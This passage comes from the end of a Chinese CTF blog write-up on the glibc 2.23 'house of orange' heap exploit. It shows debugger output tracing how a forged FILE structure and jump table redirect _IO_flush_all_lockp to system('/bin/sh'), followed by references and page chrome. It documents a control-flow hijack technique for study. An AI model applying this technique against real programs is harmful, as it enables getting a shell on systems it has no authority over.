<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">795 	  /* Something was added to the list.  Start all over again.  */</span><br><span class="line">   796 	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">   797 	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">   798 	&#125;</span><br><span class="line">   799       else</span><br><span class="line"> ► 800 	fp = fp-&gt;_chain;</span><br><span class="line">   801     &#125;</span><br><span class="line">   802 </span><br><span class="line">   803 #ifdef _IO_MTSAFE_IO</span><br><span class="line">   804   if (do_lock)</span><br><span class="line">   805     _IO_lock_unlock (list_all_lock);</span><br></pre></td></tr></table></figure>

<p>满足条件就进入了if，执行_IO_OVERFLOW</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">781 	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">  782 	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">  783 				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">  784 #endif</span><br><span class="line">  785 	   )</span><br><span class="line">► 786 	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">  787 	result = EOF;</span><br><span class="line">  788 </span><br><span class="line">  789       if (do_lock)</span><br><span class="line">  790 	_IO_funlockfile (fp);</span><br><span class="line">  791       run_fp = NULL;</span><br></pre></td></tr></table></figure>

<p>最终执行的是我们的system，rdi也就是fp，就是/bin/sh,getshell没问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x55fc6607f5d0 ◂— 0x0</span><br><span class="line"> RBX  0x55fc6607f4f0 ◂— 0x68732f6e69622f /* &apos;/bin/sh&apos; */</span><br><span class="line"> RCX  0x7f6d94bd2730 (sigprocmask+16) ◂— cmp    rax, -0x1000 /* &apos;H=&apos; */</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x55fc6607f4f0 ◂— 0x68732f6e69622f /* &apos;/bin/sh&apos; */</span><br><span class="line"> RSI  0xffffffff</span><br><span class="line"> R8   0x4</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x8</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x7f6d95172700 ◂— 0x7f6d95172700</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x0</span><br><span class="line"> RSP  0x7ffcd401da30 ◂— 0x3a30302030303030 (&apos;0000 00:&apos;)</span><br><span class="line"> RIP  0x7f6d94c19193 (_IO_flush_all_lockp+371) ◂— call   qword ptr [rax + 0x18]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x7f6d94c19284 &lt;_IO_flush_all_lockp+612&gt;    cmp    qword ptr [rbx + 0x28], rax</span><br><span class="line">   0x7f6d94c19288 &lt;_IO_flush_all_lockp+616&gt;    ja     _IO_flush_all_lockp+356 &lt;0x7f6d94c19184&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f6d94c19184 &lt;_IO_flush_all_lockp+356&gt;    mov    rax, qword ptr [rbx + 0xd8]</span><br><span class="line">   0x7f6d94c1918b &lt;_IO_flush_all_lockp+363&gt;    mov    esi, 0xffffffff</span><br><span class="line">   0x7f6d94c19190 &lt;_IO_flush_all_lockp+368&gt;    mov    rdi, rbx</span><br><span class="line"> ► 0x7f6d94c19193 &lt;_IO_flush_all_lockp+371&gt;    call   qword ptr [rax + 0x18] &lt;0x7f6d94be2390&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f6d94c19196 &lt;_IO_flush_all_lockp+374&gt;    cmp    eax, -1</span><br><span class="line">   0x7f6d94c19199 &lt;_IO_flush_all_lockp+377&gt;    mov    eax, 0xffffffff</span><br><span class="line">   0x7f6d94c1919e &lt;_IO_flush_all_lockp+382&gt;    cmove  ebp, eax</span><br><span class="line">   0x7f6d94c191a1 &lt;_IO_flush_all_lockp+385&gt;    test   r14d, r14d</span><br><span class="line">   0x7f6d94c191a4 &lt;_IO_flush_all_lockp+388&gt;    je     _IO_flush_all_lockp+464 &lt;0x7f6d94c191f0&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/giantbranch/glibc-2.23/libio/genops.c</span><br><span class="line">   781 	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">   782 	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">   783 				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   784 #endif</span><br><span class="line">   785 	   )</span><br><span class="line"> ► 786 	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">   787 	result = EOF;</span><br><span class="line">   788 </span><br><span class="line">   789       if (do_lock)</span><br><span class="line">   790 	_IO_funlockfile (fp);</span><br><span class="line">   791       run_fp = NULL;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffcd401da30 ◂— 0x3a30302030303030 (&apos;0000 00:&apos;)</span><br><span class="line">01:0008│      0x7ffcd401da38 ◂— 0x66370a2030203030 (&apos;00 0 \n7f&apos;)</span><br><span class="line">02:0010│      0x7ffcd401da40 ◂— 0x3063383135396436 (&apos;6d9518c0&apos;)</span><br><span class="line">03:0018│      0x7ffcd401da48 ◂— 0x39643666372d3030 (&apos;00-7f6d9&apos;)</span><br><span class="line">04:0020│      0x7ffcd401da50 ◂— &apos;518d000 &#125;&apos;</span><br><span class="line">05:0028│      0x7ffcd401da58 ◂— 0x7d /* &apos;&#125;&apos; */</span><br><span class="line">06:0030│      0x7ffcd401da60 —▸ 0x7ffcd401de20 ◂— 0x20 /* &apos; &apos; */</span><br><span class="line">07:0038│      0x7ffcd401da68 ◂— 0x7d /* &apos;&#125;&apos; */</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7f6d94c19193 _IO_flush_all_lockp+371</span><br><span class="line">   f 1     7f6d94bd3fbd abort+253</span><br><span class="line">   f 2     7f6d94c147ea</span><br><span class="line">   f 3     7f6d94c1f13e _int_malloc+1470</span><br><span class="line">   f 4     7f6d94c1f13e _int_malloc+1470</span><br><span class="line">   f 5     7f6d94c21184 malloc+84</span><br><span class="line">   f 6     55fc6549cd6d</span><br><span class="line">   f 7     55fc6549d402</span><br><span class="line">   f 8     7f6d94bbd830 __libc_start_main+240</span><br><span class="line">gdb-peda$ x 0x7f6d94be2390</span><br><span class="line">0x7f6d94be2390 &lt;__libc_system&gt;:	0xfa86e90b74ff8548</span><br></pre></td></tr></table></figure>

<p>那个rax就是jump table了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *(struct _IO_jump_t *)$rax</span><br><span class="line">$28 = &#123;</span><br><span class="line">  __dummy = 0x0, </span><br><span class="line">  __dummy2 = 0x0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7f6d94be2390 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a><br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>自愿打赏专区</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    
    
      <div class="footer-custom">
        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
      </div>
    

    
    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
    </div>
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    giantbranch
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/" title="CTF PWN之house of orange">https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
            <a href="/tags/ctf/" rel="tag"># ctf</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/12/14/IO_FILE 利用的基础知识/" rel="next" title="IO_FILE 利用的基础知识">
                <i class="fa fa-chevron-left"></i> IO_FILE 利用的基础知识
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/" rel="prev" title="No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析">
                No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
    <div class="footer-custom">
	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">giantbranch</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">176</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">220</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#讲解题目"><span class="nav-number">1.</span> <span class="nav-text">讲解题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-number">2.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附录——调试最后的流程劫持过程"><span class="nav-number">3.</span> <span class="nav-text">附录——调试最后的流程劫持过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附录2：-IO-flush-all-lockp流程"><span class="nav-number">4.</span> <span class="nav-text">附录2：_IO_flush_all_lockp流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">reference</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">giantbranch(simplelogin.irjqx@aleeas.com)</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




<div class="footer-custom">
<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
<br>
这是我的新博客，网站建于2017年10月
<!-- <br>以下UV,PV统计始于2018.06.23 -->
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  

    
      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/';
          this.page.identifier = '2018/12/29/CTF PWN之house of orange/';
          this.page.title = 'CTF PWN之house of orange';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://giantbranch.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  










  





  

  

  

  

  

  

</body>
</html>
